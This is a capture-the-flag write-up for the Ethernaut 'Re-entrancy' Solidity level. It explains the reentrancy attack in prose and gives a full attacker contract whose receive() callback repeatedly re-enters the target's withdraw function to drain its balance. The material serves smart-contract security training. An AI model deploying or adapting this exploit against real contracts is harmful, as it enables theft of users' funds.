# Re-entrancy Ethernaut

## Goals

=> Steal all the funds from the contract.

### Hints

- Untrusted contracts can execute code where you least expect it.
- Fallback methods
- Throw/revert bubbling
- Sometimes the best way to attack a contract is with another contract.
- See the "?" page above, section "Beyond the console"

### Solution

- So since we can withdraw the amount we have in balance and the withdraw function calls back to us we can just perform a reentrancy attack on the call to us which triggers our fallback function which then calls back to the vulnerable contract and our balance is still the same so we can call withdraw multiple times until our balance gets updated, I wrote a contract that looks for the balance of the contract, deposits this amount and then withdraws that amount, the callback to our receive function will then re enter the withdraw function for the rest of the contracts balance

### Attacker Contract

```solidity
contract Hack {
    Reentrance reentrance;
    uint256 contractValue;

    constructor(address payable _reentrance) public {
        reentrance = Reentrance(_reentrance);
    }

    receive() external payable {
        if (contractValue > 0) {
            reentrance.withdraw(contractValue);
        }
    }

    function attack() public payable {
        contractValue = address(reentrance).balance;
        require(contractValue > 0, "Contract is empty");
        reentrance.donate{value: contractValue}(address(this));
        reentrance.withdraw(contractValue);
    }

    function showBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```
